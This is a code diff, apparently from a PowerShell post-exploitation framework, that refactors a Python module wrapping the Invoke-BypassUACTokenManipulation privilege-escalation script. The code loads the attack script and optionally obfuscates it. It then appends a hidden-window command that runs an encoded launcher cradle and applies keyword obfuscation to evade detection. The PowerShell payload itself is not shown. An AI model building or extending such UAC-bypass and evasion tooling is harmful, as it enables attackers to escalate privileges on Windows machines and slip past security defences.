@@ -1,5 +1,6 @@
 from __future__ import print_function
 
+import pathlib
 import base64
 import re
 from builtins import object
@@ -20,34 +21,24 @@ class Module(object):
         userAgent = params['UserAgent']
         port = params['Port']
 
+        # read in the common module source code
         module_source = main_menu.installPath + "/data/module_source/privesc/Invoke-BypassUACTokenManipulation.ps1"
-        if obfuscate:
-            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
-            module_source = module_source.replace("module_source", "obfuscated_module_source")
+        if main_menu.obfuscate:
+            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
+            if pathlib.Path(obfuscated_module_source).is_file():
+                module_source = obfuscated_module_source
+
         try:
-            f = open(module_source, 'r')
+            with open(module_source, 'r') as f:
+                module_code = f.read()
         except:
             return handle_error_message("[!] Could not read module source path at: " + str(module_source))
 
-        module_code = f.read()
-        f.close()
-
-        # If you'd just like to import a subset of the functions from the
-        #   module source, use the following:
-        #   script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-Something", "Set-Something"])
-        script = module_code
-
-        # Second method: For calling your imported source, or holding your
-        #   inlined script. If you're importing source using the first method,
-        #   ensure that you append to the script variable rather than set.
-        #
-        # The script should be stripped of comments, with a link to any
-        #   original reference script included in the comments.
-        #
-        # If your script is more than a few lines, it's probably best to use
-        #   the first method to source it.
-        #
-        # script += """
+        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
+            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
+                                         obfuscationCommand=main_menu.obfuscateCommand)
+        else:
+            script = module_code
 
         try:
             blank_command = ""
@@ -69,11 +60,11 @@ class Module(object):
         except Exception as e:
             pass
 
-        if obfuscate:
-            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=script,
-                                          obfuscationCommand=obfuscation_command)
-        scriptEnd = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encoded_cradle)
-        script += scriptEnd
+        script_end = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encoded_cradle)
+
+        if main_menu.obfuscate:
+            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
+        script += script_end
         script = data_util.keyword_obfuscation(script)
 
         return script
